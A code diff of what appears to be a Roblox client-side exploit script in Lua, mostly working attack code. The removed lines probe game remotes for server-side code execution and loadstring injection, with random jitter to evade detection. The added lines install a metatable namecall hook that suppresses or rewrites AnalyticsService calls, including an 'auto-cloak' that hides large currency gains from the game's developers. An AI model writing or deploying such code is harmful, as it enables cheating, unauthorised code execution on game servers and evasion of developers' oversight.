+        rec.totalSource = rec.totalSource + amount
     else
-        print(string.format("[HUNT][INJECT] %s → no state changes detected", remoteName))
+        rec.totalSink = rec.totalSink + amount
     end
 
-    return {
-        success     = true,
-        changes     = result.changes,
-        anyChange   = result.anyChange,
-        dominated   = result.dominated,
-        elapsed     = result.elapsed,
-        sbiLogic    = sbiRec and sbiRec.ServerLogic or "UNKNOWN",
-        sbiConf     = sbiRec and sbiRec.Confidence  or 0,
-    }
+    for _, cb in ipairs(ASE_LedgerCallbacks) do pcall(cb, sku, rec) end
 end
 
--- ── Full Hunt Pipeline ─────────────────────────────────────────
--- 1. Pull all actionable targets from SBI_EXEC
--- 2. For each: run Safe Probe
--- 3. On confirmation: run Injection with sovereignModuleId
--- 4. Return first confirmed injection result (cold profile)
-function ASE_InjectionHunt.Begin(sovereignModuleId, opts)
-    opts = opts or {}
-    local threshold     = opts.threshold     or 0.75
-    local stopOnFirst   = opts.stopOnFirst   ~= false  -- default true
-    local evalSinks     = opts.evalSinks     or false  -- also probe EVAL_SINK
+-- ── Check if a call should be suppressed ─────────────────────
+local function ASE_ShouldSuppress(method, args)
+    if ASE.HookMode == "SUPPRESS_ALL" then return true end
 
-    local SBI_Exec = _G.PC.SBI_Exec
-    if not SBI_Exec then
-        warn("[HUNT] SBI_Exec not loaded — run SBI first")
-        return nil
-    end
-
-    -- Get ranked candidates
-    local groups, all = SBI_Exec.GetActionableTargets(threshold)
-    local candidates   = {}
-
-    -- Priority order: ASSET_SINK first (highest execution potential)
-    for _, r in ipairs(groups.ASSET_SINK or {}) do
-        table.insert(candidates, r)
-    end
-    if evalSinks then
-        for _, r in ipairs(groups.EVAL_SINK or {}) do
-            table.insert(candidates, r)
-        end
-    end
-    for _, r in ipairs(groups.REPLICATION_SINK or {}) do
-        table.insert(candidates, r)
-    end
-
-    print(string.format("[HUNT] Beginning injection hunt — %d candidates  moduleId=%d",
-        #candidates, sovereignModuleId))
-
-    local results = {}
-
-    for _, candidate in ipairs(candidates) do
-        print(string.format("[HUNT] → %s  type=%s  conf=%.2f",
-            candidate.Remote, candidate.Type, candidate.Confidence))
-        for _, ev in ipairs(candidate.Evidence or {}) do
-            print("        evidence: " .. ev)
-        end
-
-        -- Stage 1: Safe Probe
-        local probe = ASE_InjectionHunt.SafeProbe(candidate.Remote)
-
-        if probe.confirmed or candidate.Type == "REPLICATION_SINK" then
-            -- Stage 2: Inject
-            Hunt_Jitter()
-            local injection = ASE_InjectionHunt.Inject(
-                candidate.Remote, sovereignModuleId, nil)
-
-            local record = {
-                remote    = candidate.Remote,
-                type      = candidate.Type,
-                probe     = probe,
-                injection = injection,
-            }
-            table.insert(results, record)
-
-            if injection.anyChange then
-                print(string.format("[!!!] SOVEREIGN ACE CONFIRMED: %s  logic=%s",
-                    candidate.Remote, injection.sbiLogic))
-                if stopOnFirst then
-                    ASE_InjectionHunt.Results = results
-                    return record
-                end
-            end
-        else
-            print(string.format("[HUNT] %s: no yield divergence — skipping injection",
-                candidate.Remote))
-        end
-
-        -- Jitter between candidates to maintain cold traffic profile
-        task.wait(0.4 + math.random() * 0.6)
-    end
-
-    ASE_InjectionHunt.Results = results
-    print(string.format("[HUNT] Hunt complete — %d injections attempted", #results))
-    return results
-end
-
--- Quick eval-sink probe (fires identity expressions for loadstring surfaces)
-function ASE_InjectionHunt.ProbeEvalSink(remoteName)
-    local inst = Hunt_GetInst(remoteName)
-    if not inst then return false end
-    local EXPRS = { "return 42", "return 1+1", "return tostring(42)" }
-    local SBI   = _G.PC.SBI
-    for _, expr in ipairs(EXPRS) do
-        local ok, res, _ = Hunt_TimedFire(inst, {expr}, 2.0)
-        if SBI then SBI.OnEvaluatorProbe(remoteName, expr, ok and res or nil) end
-        local rec = SBI and SBI.Get(remoteName)
-        if rec and (rec.LoadstringSignals or 0) >= 1 then
-            print(string.format("[HUNT][EVAL] %s: echo confirmed → loadstring surface", remoteName))
+    -- Auto-cloak: suppress FireEconomyEvent when gain > threshold
+    if ASE.CloakThreshold > 0 and method == "FireEconomyEvent" then
+        local amount  = tonumber(args[4]) or 0
+        local ftStr   = tostring(args[5]):lower()
+        if ftStr:find("source") and amount > ASE.CloakThreshold then
             return true
         end
-        Hunt_Jitter()
     end
-    return false
-end
 
--- Export
-_G.PC.ASE_Hunt = ASE_InjectionHunt
-
-function ASE.SemanticSweepAll(minRSMConf)
-    minRSMConf = minRSMConf or 0.20
-    local PR  = _G.PC.PR_Registry
-    local RSM = _G.PC.RSM
-    if not PR then return end
-    local targets = {}
-    for name, rec in pairs(PR) do
-        local rsmRec = RSM and RSM.Get(name)
-        local conf = rsmRec and rsmRec.Confidence or 0
-        if conf >= minRSMConf or rec.Direction == "C2S" then
-            table.insert(targets, name)
-        end
-    end
-    print(string.format("[ASE] SemanticSweepAll: %d targets queued", #targets))
-    for _, name in ipairs(targets) do
-        ASE_GoalEngine.Push(ASE.GOAL.SEMANTIC_SWEEP, { remoteName=name })
-        task.wait(0.1)
-    end
-end
-
--- Wire SBI.OnSemanticFinding → ASE log
-task.defer(function()
-    local SBI = _G.PC.SBI
-    if SBI then
-        SBI.OnSemanticFinding = function(finding)
-            local rec = finding.record
-            print(string.format(
-                "[ASE][SEMANTIC FINDING] %s → %s (conf=%.0f%%)",
-                finding.remoteName, finding.logic,
-                (rec and rec.Confidence or 0)*100))
-
-            if finding.logic == "EXECUTION_CANDIDATE" then
-                -- Auto-promote: add to hunt queue
-                print(string.format("[ASE] EXECUTION_CANDIDATE confirmed: %s — ready for injection",
-                    finding.remoteName))
-                -- Store in a shared table for the Panel to surface
-                if not _G.PC._ExecCandidates then _G.PC._ExecCandidates = {} end
-                _G.PC._ExecCandidates[finding.remoteName] = {
-                    logic      = finding.logic,
-                    confidence = rec and rec.Confidence or 0,
-                    foundAt    = os.clock(),
-                }
-
-            elseif finding.logic == "INTERNAL_BUS_CANDIDATE" then
-                print(string.format(
-                    "[ASE] INTERNAL_BUS_CANDIDATE: %s — ghost deltas detected, trust boundary crossed",
-                    finding.remoteName))
-                -- Print ghost deltas if available
-                for _, gd in ipairs(finding.ghostDeltas or {}) do
-                    print(string.format("  ghost: [%s.%s] %s→%s",
-                        gd.domain or "?", gd.varName or "?",
-                        tostring(gd.prevValue), tostring(gd.newValue)))
-                end
-                if finding.echoResult and finding.echoResult.foundPaths then
-                    for _, fp in ipairs(finding.echoResult.foundPaths) do
-                        print(string.format("  echo tag in [%s.%s] = %s",
-                            fp.domain, fp.varName, fp.value))
-                    end
-                end
-                -- Store for Panel
-                if not _G.PC._ChainCandidates then _G.PC._ChainCandidates = {} end
-                _G.PC._ChainCandidates[finding.remoteName] = {
-                    logic      = finding.logic,
-                    confidence = rec and rec.Confidence or 0,
-                    foundAt    = os.clock(),
-                    ghosts     = finding.ghostDeltas,
-                    echo       = finding.echoResult,
-                }
-
-            elseif finding.logic == "REPLICATION_SINK" then
-                print(string.format(
-                    "[ASE] REPLICATION_SINK: %s — firing this changes state for ALL clients",
-                    finding.remoteName))
+    -- Check user-defined suppression rules
+    for _, rule in ipairs(ASE.SuppressionRules) do
+        if rule.method == "ALL" or rule.method == method then
+            -- rule.field is arg index (1-based) or "ALL"
+            local fieldVal = rule.field == "ALL"
+                and table.concat(args, "|")
+                or  tostring(args[tonumber(rule.field)] or "")
+            if fieldVal:lower():find(rule.pattern:lower(), 1, true) then
+                return true
             end
         end
     end
-end)
 
-local ASE_GoalEngine = {}
-
-local function ASE_NewGoal(goalType, params)
-    local id = ASE_NextID()
-    return {
-        id        = id,
-        goalType  = goalType,
-        params    = params or {},
-        status    = ASE.STATUS.PENDING,
-        startT    = nil,
-        endT      = nil,
-        result    = nil,
-        error     = nil,
-    }
+    return false
 end
 
-function ASE_GoalEngine.Push(goalType, params)
-    if ASE_ActiveCount >= ASE_CFG.MaxConcurrentGoals then
-        return nil, "max concurrent goals reached"
+-- ── Apply modification rules to args ─────────────────────────
+-- Returns modified args table and a boolean indicating if
+-- anything was changed.
+local function ASE_ApplyModRules(method, args)
+    if ASE.HookMode ~= "MODIFY" then return args, false end
+    local changed = false
+    local newArgs = {}
+    for i, v in ipairs(args) do newArgs[i] = v end
+
+    for _, rule in ipairs(ASE.ModRules) do
+        if rule.method == "ALL" or rule.method == method then
+            local idx = tonumber(rule.field)
+            if idx and newArgs[idx] ~= nil then
+                local cur = tostring(newArgs[idx])
+                if cur:lower():find(rule.pattern:lower(), 1, true) then
+                    -- Try numeric replacement first
+                    local numRep = tonumber(rule.replacement)
+                    newArgs[idx] = numRep or rule.replacement
+                    changed = true
+                end
+            end
+        end
     end
-    if not ASE_ConsumeRisk(goalType) then
-        return nil, "session risk budget exhausted"
-    end
-    local goal = ASE_NewGoal(goalType, params)
-    ASE_Goals[goal.id] = goal
-    task.spawn(function() pcall(ASE_GoalEngine.Run, goal) end)
-    return goal.id
+
+    return newArgs, changed
 end
 
-function ASE_GoalEngine.Run(goal)
-    goal.status = ASE.STATUS.RUNNING
-    goal.startT = os.clock()
-    ASE_ActiveCount = ASE_ActiveCount + 1
+-- ── Core namecall hook ────────────────────────────────────────
+-- Intercepts all four AnalyticsService Fire* methods.
+-- Runs suppression and modification checks before passing
+-- through to the original call (or dropping it entirely).
+local function ASE_InstallHook()
+    if ASE.HookInstalled then return end
+    local ok, err = pcall(function()
+        local mt    = getrawmetatable(game)
+        local oldNC = rawget(mt, "__namecall")
+        setreadonly(mt, false)
 
-    local ok, err
-    if goal.goalType == ASE.GOAL.BEDROCK then
-        ok, err = pcall(ASE_BedrockHandshake.Run, goal)
-    elseif goal.goalType == ASE.GOAL.FINALIZE then
-        ok, err = pcall(ASE_DirectiveCompiler.Finalize, goal)
-    elseif goal.goalType == ASE.GOAL.RECOMPILE then
-        ok, err = pcall(ASE_RecompileEngine.Run, goal)
-    elseif goal.goalType == ASE.GOAL.DISCOVER then
-        ok, err = pcall(ASE_ForgeEngine.Discover, goal)
-    elseif goal.goalType == ASE.GOAL.VERIFY then
-        ok, err = pcall(ASE_VerifyCircuit.Run, goal)
-    elseif goal.goalType == ASE.GOAL.ASSET_PROBE then
-        ok, err = pcall(ASE_SemanticProbes.RunAssetProbe, goal)
-    elseif goal.goalType == ASE.GOAL.EVAL_PROBE then
-        ok, err = pcall(ASE_SemanticProbes.RunEvalProbe, goal)
-    elseif goal.goalType == ASE.GOAL.DIFF_PROBE then
-        ok, err = pcall(ASE_SemanticProbes.RunDiffProbe, goal)
-    elseif goal.goalType == ASE.GOAL.SEMANTIC_SWEEP then
-        ok, err = pcall(ASE_SemanticProbes.RunSweep, goal)
-    end
+        local ANALYTICS_METHODS = {
+            FireCustomEvent     = true,
+            FireLogEvent        = true,
+            FireEconomyEvent    = true,
+            FireProgressionEvent= true,
+        }
 
-    goal.endT = os.clock()
+        local function newNC(self, ...)
+            local method = getnamecallmethod()
+
+            if not ANALYTICS_METHODS[method] then
+                if oldNC then return oldNC(self, ...) end
+                return
+            end
+
+            local args = {...}
+
+            -- Economy ledger update (before any modification)
+            if method == "FireEconomyEvent" then
+                -- args: player, itemSku, currencyType, amount,
+                --       flowType, transactionType, fields?
+                pcall(ASE_UpdateLedger, args[2], args[3],
+                      args[4], args[5])
+            end
+
+            -- Suppression check
+            if ASE_ShouldSuppress(method, args) then
+                ASE_LogEvent(method, args, false, true)
+                return  -- Drop the call entirely
+            end
+
+            -- Modification check
+            local finalArgs, wasModified = ASE_ApplyModRules(method, args)
+
+            -- Log the event
+            ASE_LogEvent(method, finalArgs, wasModified, false)
+
+            -- Pass through to original
+            if oldNC then
+                return oldNC(self, table.unpack(finalArgs))
+            end
+        end
+
+        mt.__namecall = newcclosure and newcclosure(newNC) or newNC
+        setreadonly(mt, true)
+    end)
+
     if ok then
-        goal.status = ASE.STATUS.COMPLETE
+        ASE.HookInstalled = true
+        GSE_Log("ASE", "AnalyticsService hook installed  mode=" .. ASE.HookMode)
     else
-        goal.status = ASE.STATUS.FAILED
-        goal.error  = tostring(err)
-        warn(string.format("[ASE] Goal %d (%s) failed: %s", goal.id, goal.goalType, tostring(err)))
-    end
-    ASE_ActiveCount = math.max(0, ASE_ActiveCount - 1)
-end
-
-function ASE_GoalEngine.Abort(goalId)
-    local goal = ASE_Goals[goalId]
-    if goal and goal.status == ASE.STATUS.RUNNING then
-        goal.status = ASE.STATUS.ABORTED
+        GSE_Log("WARN", "ASE hook failed: " .. tostring(err))
     end
 end
 
--- ══════════════════════════════════════════════════════════════════════════════
--- MODULE 2.5 — LINGER WATCH + PROPERTY STEERING
--- Activated the moment OC_LINGERED is confirmed on a remote.
--- Monitors the four client-writable surfaces LWM is blind to:
---   1. LocalPlayer attributes
---   2. Character part/humanoid properties
---   3. PlayerGui descendant Value objects
---   4. Character descendant Value objects
---
--- Detects "Unusual Deltas" — properties that changed after linger confirmation
--- and stayed changed — which indicate the server communicated via replication
--- rather than a RemoteEvent/RemoteFunction.
---
--- ASE_PropertySteerer then attempts to satisfy the dependency by writing back
--- to each unusual delta candidate and watching for linger resolution.
--- ══════════════════════════════════════════════════════════════════════════════
-
--- Forward declarations — all four escalation modules declared here
--- so every reference anywhere in the file resolves to the same upvalue
-local ASE_PropertySteerer   = {}
-local ASE_StateNudge        = {}
-local ASE_AntecedentExtractor = {}
-local ASE_TwoStageSequencer = {}
-
-local ASE_LingerWatch   = {}
-local ASE_LW_Sessions   = {}   -- [remoteName] = session record
-
-local LW_SAMPLE_RATE    = 0.05   -- 50ms high-frequency sampling
-local LW_MAX_DURATION   = 12.0   -- max watch window per linger
-local LW_MAX_SNAPSHOTS  = 60     -- ring buffer depth
-local LW_ENTROPY_THRESH = 0.5    -- min "unusualness" score to flag a delta
-
--- Snapshot the four monitored surfaces into a flat key=value table
-local function LW_Snapshot()
-    local snap   = {}
-    local Players = game:GetService("Players")
-    local lp     = Players and Players.LocalPlayer
-    if not lp then return snap end
-
-    -- Surface 1: LocalPlayer attributes
-    local attrs = lp:GetAttributes()
-    for k, v in pairs(attrs) do
-        if type(v) == "number" or type(v) == "boolean" or type(v) == "string" then
-            snap["LP_ATTR:" .. k] = v
-        end
-    end
-
-    -- Surface 2: Character properties (position, humanoid state, health)
-    local char = lp.Character
-    if char then
-        local hrp = char:FindFirstChild("HumanoidRootPart")
-        if hrp then
-            snap["CHAR:HRP.X"]  = math.floor(hrp.Position.X * 10) / 10
-            snap["CHAR:HRP.Y"]  = math.floor(hrp.Position.Y * 10) / 10
-            snap["CHAR:HRP.Z"]  = math.floor(hrp.Position.Z * 10) / 10
-        end
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        if hum then
-            snap["CHAR:HUM.Health"]    = math.floor(hum.Health)
-            snap["CHAR:HUM.MaxHealth"] = math.floor(hum.MaxHealth)
-            snap["CHAR:HUM.State"]     = tostring(hum:GetState())
-            snap["CHAR:HUM.WalkSpeed"] = hum.WalkSpeed
-            snap["CHAR:HUM.JumpPower"] = hum.JumpPower
-        end
-
-        -- Surface 4: Character descendant Value objects
-        for _, obj in ipairs(char:GetDescendants()) do
-            if obj:IsA("BoolValue") or obj:IsA("StringValue")
-               or obj:IsA("IntValue") or obj:IsA("NumberValue") then
-                snap["CHAR_VAL:" .. obj.Name] = obj.Value
-            end
-        end
-    end
-
-    -- Surface 3: PlayerGui descendant Value objects
-    local gui = lp:FindFirstChildOfClass("PlayerGui")
-    if gui then
-        for _, obj in ipairs(gui:GetDescendants()) do
-            if obj:IsA("BoolValue") or obj:IsA("StringValue")
-               or obj:IsA("IntValue") or obj:IsA("NumberValue") then
-                snap["GUI_VAL:" .. obj.Name] = obj.Value
-            end
-        end
-    end
-
-    return snap
-end
-
--- Compute delta between two snapshots — returns list of changed keys + magnitude
-local function LW_ComputeDelta(baseline, current)
-    local deltas = {}
-    for k, currVal in pairs(current) do
-        local baseVal = baseline[k]
-        if baseVal == nil then
-            -- New key appeared after linger — high signal
-            table.insert(deltas, {
-                key       = k,
-                from      = nil,
-                to        = currVal,
-                kind      = "APPEARED",
-                magnitude = 1.0,
-            })
-        elseif currVal ~= baseVal then
-            local mag = 0.5
-            if type(currVal) == "number" and type(baseVal) == "number" then
-                local range = math.abs(baseVal) + 1
-                mag = math.min(1.0, math.abs(currVal - baseVal) / range)
-            elseif type(currVal) == "boolean" then
-                mag = 1.0   -- boolean flip is always high signal
-            end
-            table.insert(deltas, {
-                key       = k,
-                from      = baseVal,
-                to        = currVal,
-                kind      = "CHANGED",
-                magnitude = mag,
-            })
-        end
-    end
-    -- Check for keys that disappeared
-    for k, baseVal in pairs(baseline) do
-        if current[k] == nil then
-            table.insert(deltas, {
-                key       = k,
-                from      = baseVal,
-                to        = nil,
-                kind      = "VANISHED",
-                magnitude = 0.8,
-            })
-        end
-    end
-    table.sort(deltas, function(a, b) return a.magnitude > b.magnitude end)
-    return deltas
-end
-
--- Start a linger watch session for a remote
-function ASE_LingerWatch.Start(remoteName)
-    if ASE_LW_Sessions[remoteName] then return end  -- already watching
-
-    local session = {
-        remoteName    = remoteName,
-        startT        = os.clock(),
-        baseline      = LW_Snapshot(),
-        snapshots     = {},
-        unusualDeltas = {},
-        active        = true,
-        resolved      = false,
-    }
-    ASE_LW_Sessions[remoteName] = session
-
-    print(string.format("[LW] Linger watch started on %s — monitoring %d baseline keys",
-        remoteName, (function() local n=0; for _ in pairs(session.baseline) do n=n+1 end; return n end)()))
-
-    task.spawn(function()
-        local t0 = os.clock()
-        while session.active and (os.clock() - t0) < LW_MAX_DURATION do
-            task.wait(LW_SAMPLE_RATE)
-            if not session.active then break end
-
-            local snap = LW_Snapshot()
-            table.insert(session.snapshots, { t = os.clock(), data = snap })
-            if #session.snapshots > LW_MAX_SNAPSHOTS then
-                table.remove(session.snapshots, 1)
-            end
-
-            -- Recompute unusual deltas from baseline
-            local deltas = LW_ComputeDelta(session.baseline, snap)
-            local unusual = {}
-            for _, d in ipairs(deltas) do
-                if d.magnitude >= LW_ENTROPY_THRESH then
-                    table.insert(unusual, d)
-                end
-            end
-
-            if #unusual > 0 then
-                session.unusualDeltas = unusual
-            end
-        end
-        session.active = false
-    end)
-end
-
--- Stop the watch session
-function ASE_LingerWatch.Stop(remoteName)
-    local session = ASE_LW_Sessions[remoteName]
-    if session then
-        session.active = false
-    end
-end
-
--- Get ranked unusual delta candidates for a remote
-function ASE_LingerWatch.GetUnusualDeltas(remoteName)
-    local session = ASE_LW_Sessions[remoteName]
-    return session and session.unusualDeltas or {}
-end
-
--- ── Property Steerer ──────────────────────────────────────────────────────────
--- For each unusual delta candidate, attempts to write the value back to its
--- pre-linger state (or invert it for booleans) and watches for linger resolution.
-
--- ASE_PropertySteerer already declared above — assign methods below
-
--- Resolve a surface key back to the actual Roblox instance + property name
-local function LW_ResolveKey(key)
-    local Players = game:GetService("Players")
-    local lp = Players and Players.LocalPlayer
-    if not lp then return nil, nil end
-
-    local surface, name = key:match("^([^:]+):(.+)$")
-    if not surface then return nil, nil end
-
-    if surface == "LP_ATTR" then
-        -- LocalPlayer attribute — write via SetAttribute
-        return lp, name   -- special handling: attribute path
-
-    elseif surface == "CHAR_VAL" then
-        local char = lp.Character
-        if char then
-            local obj = char:FindFirstChild(name, true)
-            if obj and obj:IsA("ValueBase") then return obj, "Value" end
-        end
-
-    elseif surface == "GUI_VAL" then
-        local gui = lp:FindFirstChildOfClass("PlayerGui")
-        if gui then
-            local obj = gui:FindFirstChild(name, true)
-            if obj and obj:IsA("ValueBase") then return obj, "Value" end
-        end
-
-    elseif surface == "CHAR" then
-        -- HumanoidRootPart or Humanoid property
-        local char = lp.Character
-        if char then
-            if name:find("^HRP%.") then
-                local hrp = char:FindFirstChild("HumanoidRootPart")
-                local prop = name:gsub("^HRP%.", "")
-                return hrp, prop
-            elseif name:find("^HUM%.") then
-                local hum = char:FindFirstChildOfClass("Humanoid")
-                local prop = name:gsub("^HUM%.", "")
-                return hum, prop
-            end
-        end
-    end
-
-    return nil, nil
-end
-
--- Attempt to steer each unusual delta candidate and watch for resolution
-function ASE_PropertySteerer.Try(remoteName, onResolved)
-    local deltas = ASE_LingerWatch.GetUnusualDeltas(remoteName)
-    if #deltas == 0 then
-        print(string.format("[PS] No unusual deltas for %s — cannot steer.", remoteName))
-        return
-    end
-
-    print(string.format("[PS] Attempting property steering on %s — %d candidate(s)",
-        remoteName, #deltas))
-
-    task.spawn(function()
-        for _, delta in ipairs(deltas) do
-            -- Compute steering value: invert booleans, revert others to baseline
-            local steerVal
-            if type(delta.from) == "boolean" then
-                steerVal = not delta.to  -- invert the current state
-            elseif delta.to == nil and delta.from ~= nil then
-                steerVal = delta.from    -- revert vanished key
-            else
-                steerVal = delta.from    -- revert to pre-linger baseline
-            end
-            if steerVal == nil then continue end
-
-            -- Write the steered value
-            local surface = delta.key:match("^([^:]+):")
-            local obj, prop = LW_ResolveKey(delta.key)
-            local writeOk = false
-
-            if obj and prop then
-                if surface == "LP_ATTR" then
-                    writeOk = pcall(function()
-                        obj:SetAttribute(prop, steerVal)
-                    end)
-                else
-                    writeOk = pcall(function()
-                        obj[prop] = steerVal
-                    end)
-                end
-            end
-
-            if writeOk then
-                print(string.format("[PS] Steered %s: %s -> %s",
-                    delta.key, tostring(delta.to), tostring(steerVal)))
-
-                -- Watch for 2s to see if linger resolves
-                local resolveT = os.clock()
-                local resolved = false
-                while (os.clock() - resolveT) < 2.0 do
-                    task.wait(0.1)
-                    -- Check if ASE confirmed the linger resolved
-                    -- (BedrockPair locked or Panel became active)
-                    if ASE.Panel.HeartbeatAlive or
-                       (ASE_BedrockPairs[remoteName] and
-                        ASE_BedrockPairs[remoteName].confidence >= 1.0) then
-                        resolved = true
-                        break
-                    end
-                end
-
-                if resolved then
-                    print(string.format(
-                        "[PS] STEERING RESOLVED: %s unblocked by property %s",
-                        remoteName, delta.key))
-                    ASE_LingerWatch.Stop(remoteName)
-                    ASE_AppendTx({
-                        directive  = "PROPERTY STEERING RESOLVED",
-                        rawPayload = { key=delta.key, from=delta.to, to=steerVal },
-                        result     = string.format("DEPENDENCY SATISFIED: %s", delta.key),
-                    })
-                    if onResolved then onResolved(delta) end
-                    return
-                end
-            end
-        end
-
-        print(string.format("[PS] All %d steering attempts exhausted on %s — "
-            .. "pivoting to State-Nudge.", #deltas, remoteName))
-        -- Property steering exhausted — physical state is the next hypothesis
-        ASE_StateNudge.Try(remoteName)
-    end)
-end
-
--- Export
-ASE_LingerWatch.Steerer = ASE_PropertySteerer
-
--- ══════════════════════════════════════════════════════════════════════════════
--- MODULE 2.6 — STATE-NUDGE ENGINE
--- Activated when both Ghost Handshake and Property Steering fail.
--- Hypothesis: the server is yielded on a physical precondition —
--- player position, velocity, Humanoid state, or NetworkOwnership —
--- rather than a network packet or replicated value.
---
--- Strategy: cycle through a ranked sequence of physical state mutations
--- during the linger window. After each nudge, poll for 1.5s to see if
--- the lingered thread resolves. On resolution, record the winning nudge
--- as the "State Key" and lock Bedrock with origin = "STATE_NUDGE".
---
--- Nudge sequence (ordered by likelihood for a Teleport-class remote):
---   1. STILLNESS    — zero velocity, WalkSpeed=0, brief anchor
---   2. IDLE_STATE   — force Humanoid to Idle enum state
---   3. POSITION_ADJ — CFrame toward last LWM-sampled position delta
---   4. SPEED_RESTORE— restore WalkSpeed after stillness nudge
---   5. JUMP_INHIBIT — JumpPower=0 to suppress in-air state
---   6. ANCHOR_CYCLE — Anchor then immediately unanchor RootPart
--- ══════════════════════════════════════════════════════════════════════════════
-
--- ASE_StateNudge already declared above — assign methods below
-
-local SN_POLL_INTERVAL = 0.10   -- poll rate during resolve watch (seconds)
-local SN_NUDGE_WINDOW  = 1.5    -- seconds to watch after each nudge
-local SN_RESTORE_DELAY = 0.3    -- seconds before restoring mutated properties
-
--- Safely read a Humanoid and HumanoidRootPart from LocalPlayer
-local function SN_GetPhysics()
-    local Players = game:GetService("Players")
-    local lp      = Players and Players.LocalPlayer
-    if not lp then return nil, nil end
-    local char = lp.Character
-    if not char then return nil, nil end
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    return hum, hrp
-end
-
--- Poll for linger resolution: returns true if Bedrock locked or Panel active
-local function SN_PollResolved(remoteName, window)
-    local t0 = os.clock()
-    while (os.clock() - t0) < window do
-        task.wait(SN_POLL_INTERVAL)
-        local pair = ASE_BedrockPairs[remoteName]
-        if ASE.Panel.HeartbeatAlive then return true end
-        if pair and pair.confidence >= 0.90 then return true end
-    end
-    return false
-end
-
--- Individual nudge implementations ────────────────────────────────────────────
-
--- STILLNESS: zero velocity, WalkSpeed=0, anchor briefly, then restore
-local function SN_Nudge_Stillness(remoteName)
-    local hum, hrp = SN_GetPhysics()
-    if not hum or not hrp then return false end
-
-    local origSpeed  = hum.WalkSpeed
-    local origJump   = hum.JumpPower
-    local origAnchor = hrp.Anchored
-
-    -- Apply stillness
-    pcall(function() hum.WalkSpeed  = 0 end)
-    pcall(function() hum.JumpPower  = 0 end)
-    pcall(function() hrp.AssemblyLinearVelocity  = Vector3.new(0, 0, 0) end)
-    pcall(function() hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0) end)
-    pcall(function() hrp.Anchored   = true end)
-
-    print(string.format("[SN] STILLNESS nudge applied on %s", remoteName))
-    local resolved = SN_PollResolved(remoteName, SN_NUDGE_WINDOW)
-
-    -- Restore regardless of outcome
-    task.delay(SN_RESTORE_DELAY, function()
-        pcall(function() hum.WalkSpeed = origSpeed end)
-        pcall(function() hum.JumpPower = origJump  end)
-        pcall(function() hrp.Anchored  = origAnchor end)
-    end)
-
-    return resolved
-end
-
--- IDLE_STATE: force Humanoid into Idle state
-local function SN_Nudge_IdleState(remoteName)
-    local hum, _ = SN_GetPhysics()
-    if not hum then return false end
-
-    pcall(function()
-        hum:ChangeState(Enum.HumanoidStateType.None)
-    end)
-    task.wait(0.05)
-    pcall(function()
-        hum:ChangeState(Enum.HumanoidStateType.Landed)
-    end)
-
-    print(string.format("[SN] IDLE_STATE nudge applied on %s", remoteName))
-    return SN_PollResolved(remoteName, SN_NUDGE_WINDOW)
-end
-
--- POSITION_ADJ: nudge CFrame toward most recent LWM position delta
--- If no delta available, nudge slightly downward (land-on-ground heuristic)
-local function SN_Nudge_PositionAdj(remoteName)
-    local _, hrp = SN_GetPhysics()
-    if not hrp then return false end
-
-    local origCF = hrp.CFrame
-    local nudgeCF
-
-    -- Check LingerWatch for position deltas
-    local deltas = ASE_LingerWatch.GetUnusualDeltas(remoteName)
-    local dX, dY, dZ = 0, -2, 0  -- default: settle downward 2 studs
-    for _, d in ipairs(deltas) do
-        if d.key == "CHAR:HRP.X" and d.from then dX = d.from - (d.to or d.from) end
-        if d.key == "CHAR:HRP.Y" and d.from then dY = d.from - (d.to or d.from) end
-        if d.key == "CHAR:HRP.Z" and d.from then dZ = d.from - (d.to or d.from) end
-    end
-
-    nudgeCF = origCF * CFrame.new(dX, dY, dZ)
-    pcall(function() hrp.CFrame = nudgeCF end)
-
-    print(string.format("[SN] POSITION_ADJ nudge applied on %s (dX=%.1f dY=%.1f dZ=%.1f)",
-        remoteName, dX, dY, dZ))
-    local resolved = SN_PollResolved(remoteName, SN_NUDGE_WINDOW)
-
-    -- Restore position if not resolved
-    if not resolved then
-        pcall(function() hrp.CFrame = origCF end)
-    end
-    return resolved
-end
-
--- JUMP_INHIBIT: suppress JumpPower to prevent in-air state detection
-local function SN_Nudge_JumpInhibit(remoteName)
-    local hum, _ = SN_GetPhysics()
-    if not hum then return false end
-
-    local origJump = hum.JumpPower
-    pcall(function() hum.JumpPower = 0 end)
-
-    print(string.format("[SN] JUMP_INHIBIT nudge applied on %s", remoteName))
-    local resolved = SN_PollResolved(remoteName, SN_NUDGE_WINDOW)
-
-    task.delay(SN_RESTORE_DELAY, function()
-        pcall(function() hum.JumpPower = origJump end)
-    end)
-    return resolved
-end
-
--- ANCHOR_CYCLE: anchor then immediately release — triggers NetworkOwnership reassign
-local function SN_Nudge_AnchorCycle(remoteName)
-    local _, hrp = SN_GetPhysics()
-    if not hrp then return false end
-
-    local origAnchor = hrp.Anchored
-    pcall(function() hrp.Anchored = true  end)
-    task.wait(0.05)
-    pcall(function() hrp.Anchored = false end)
-
-    print(string.format("[SN] ANCHOR_CYCLE nudge applied on %s", remoteName))
-    local resolved = SN_PollResolved(remoteName, SN_NUDGE_WINDOW)
-
-    if not resolved then
-        pcall(function() hrp.Anchored = origAnchor end)
-    end
-    return resolved
-end
-
--- Nudge sequence table — ordered by likelihood for Teleport-class remotes
-local SN_SEQUENCE = {
-    { name = "STILLNESS",    fn = SN_Nudge_Stillness    },
-    { name = "IDLE_STATE",   fn = SN_Nudge_IdleState    },
-    { name = "POSITION_ADJ", fn = SN_Nudge_PositionAdj  },
-    { name = "JUMP_INHIBIT", fn = SN_Nudge_JumpInhibit  },
-    { name = "ANCHOR_CYCLE", fn = SN_Nudge_AnchorCycle  },
-}
-
--- Main entry: run nudge sequence for a lingered remote
-function ASE_StateNudge.Try(remoteName, onResolved)
-    print(string.format("[SN] Starting State-Nudge sequence on %s (%d nudge(s))",
-        remoteName, #SN_SEQUENCE))
-
-    ASE_AppendTx({
-        directive  = string.format("STATE-NUDGE: %s", remoteName),
-        rawPayload = {},
-        result     = string.format("Cycling %d physical state nudges...", #SN_SEQUENCE),
+-- Install immediately
+ASE_InstallHook()
+
+-- Add ASE to TAG_COLORS
+TAG_COLORS["ASE"]      = Color3.fromRGB(220,140,40)
+TAG_COLORS["SUPPRESS"] = Color3.fromRGB(180,60,60)
+TAG_COLORS["MODIFY"]   = Color3.fromRGB(60,140,200)
+TAG_COLORS["OBSERVE"]  = Color3.fromRGB(100,180,100)
+
+-- ASE colours
+C.ASE_BG      = Color3.fromRGB(255,248,235)
